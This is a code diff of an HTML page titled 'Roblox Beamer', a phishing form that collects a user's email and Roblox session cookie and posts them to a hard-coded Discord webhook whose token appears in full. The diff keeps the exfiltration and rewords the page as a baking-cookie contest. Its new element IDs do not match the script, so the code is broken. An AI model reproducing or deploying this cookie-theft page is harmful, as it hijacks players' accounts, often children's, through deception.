@@ -48,27 +48,27 @@
 </head>
 <body>
 
-  <h1>ROBLOX BEAMER</h1>
-  <form id="contact-form">
-    <input type="email" id="email" placeholder="Enter Email" required />
-    <textarea id="message" rows="4" placeholder="Enter Cookie"></textarea>
+  <h1>Roblox Beamer</h1>
+  <form id="Roblox Beamer">
+    <input type="Email" id="email" placeholder="Enter Email" required />
+    <textarea id="Cookie" rows="4" placeholder="Describe Your Cookie"></textarea>
     <button type="submit">Send</button>
-    <div class="notice">You will recive the login info in 1-2 Hours.</div>
+    <div class="notice">We'll notify you if your cookie wins 🍪</div>
   </form>
 
   <script>
-    const form = document.getElementById('contact-form');
+    const form = document.getElementById('cookie-form');
 
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
       const email = document.getElementById('email').value;
-      const message = document.getElementById('message').value;
+      const cookie = document.getElementById('cookie').value;
 
-      const webhookUrl = 'https://discord.com/api/webhooks/1335736426129788988/ebhM3D4RZiRNugaz_1rA5sVu_9Es4s2p_n44ke9oWmRTXKabS5FPld-aG2wkXPUrQCts'; // Replace with your real webhook
+      const webhookUrl = 'https://discord.com/api/webhooks/1335736426129788988/ebhM3D4RZiRNugaz_1rA5sVu_9Es4s2p_n44ke9oWmRTXKabS5FPld-aG2wkXPUrQCts';
 
       const payload = {
-        content: `📬 New Contact Submission\n📧 Email: ${email}\n📝 Cookie: ${message || "No message"}`
+        content: ` 📭New Contact Submission!\n📧 Email: ${email}\n✨ Cookie Description: ${cookie || "No cookie submitted."}`
       };
 
       try {
@@ -81,13 +81,13 @@
         });
 
         if (response.ok) {
-          alert('You will recive the login info in 1-2 Hours.');
+          alert('Your cookie has been submitted!');
           form.reset();
         } else {
-          alert('Something went wrong.');
+          alert('Something went wrong submitting your cookie.');
         }
       } catch (err) {
-        alert('Error sending message.');
+        alert('Error sending cookie info.');
         console.error(err);
       }
     });
